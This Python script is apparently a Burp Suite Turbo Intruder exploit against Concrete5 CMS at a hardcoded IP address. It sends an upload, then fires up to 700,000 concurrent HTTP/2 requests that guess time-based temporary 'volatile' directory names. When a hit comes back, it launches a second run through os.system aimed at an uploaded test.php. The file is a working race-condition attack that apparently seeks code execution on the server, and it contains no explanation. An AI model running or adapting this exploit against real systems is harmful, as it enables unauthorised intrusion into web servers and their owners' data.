import os

def queueRequests(target, wordlists):
    engine = RequestEngine(  # this is just a protocol:domain:port string like https://example.com:443
        endpoint=target.endpoint,
        concurrentConnections=100,
        requestsPerConnection=300,
        pipeline=True,
        #maxQueueSize=200,
        timeout=65,
        maxRetriesPerRequest=2,
        engine=Engine.HTTP2
        )

    #engine.queue(target.req)
    t = '{:.6f}'.format(time.time()).split('.')
    t[0] = int(t[0])
    oddRequest ="""GET /concrete5/application/files/tmp/volatile-0-%s/ HTTP/1.1
Host: 13.40.10.158
Connection: close

"""
    #for i in range(1):
        #engine.queue(target.req) # my upload
    for i in range(700000):
        if i==10:
            engine.queue(target.req) # my upload
        volatile_dir_id = '%08x%05x' % (t[0], i)
        engine.queue(oddRequest, volatile_dir_id)

def handleResponse(req, interesting):
    if req.status!=404: 
         table.add(req)
         f=open('/tmp/turbo.log','a')
         try:
            oddRequest ="""GET /concrete5/application/files/tmp/volatile-0-%s/ HTTP/1.1
Host: 13.40.10.158
Connection: close

"""
            if len(req.words):
                f.write('\nstart 2nd turbo')
                g=open('/var/www/html/concrete5/exploit/request2.txt','w')
                g.write(oddRequest.replace('%s/',req.words[0] +'/test.php'))
                g.close()
                os.system('java -jar /home/adrian/.BurpSuite/bapps/9abaa233088242e8be252cd4ff534988/build/libs/turbo-intruder-all.jar /var/www/html/concrete5/exploit/script2.py /var/www/html/concrete5/exploit/request2.txt http://13.40.10.158  foo')
                f.write('\nfinished 2nd turbo')
            #for i in range(500000):
                #req.engine.queue(req.template, req.words[0]+'/test.php')
         except Exception as e: 
                f.write('error')
                f.write(e)
                #print('error' + e)
         finally:
                f.close()

         
